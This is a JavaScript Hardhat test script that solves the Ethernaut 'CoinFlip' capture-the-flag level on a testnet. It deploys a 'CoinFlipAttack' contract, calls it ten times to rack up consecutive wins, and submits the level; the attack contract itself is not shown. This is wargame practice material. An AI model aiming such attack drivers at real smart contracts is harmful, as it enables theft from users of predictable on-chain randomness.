// npx hardhat test ./test/03_coin_flip.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "CoinFlip";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._03_coin_flip, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    let attackFactory = await ethers.getContractFactory("CoinFlipAttack");
    let attack = await attackFactory.deploy();
    for (let i = 0; i < 10; i++) {
        let tx = await attack.flipAttack(
            levelContract.address
        );
        await tx.wait();
        console.log("Our consecutive wins -> " + await levelContract.consecutiveWins())
    }
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});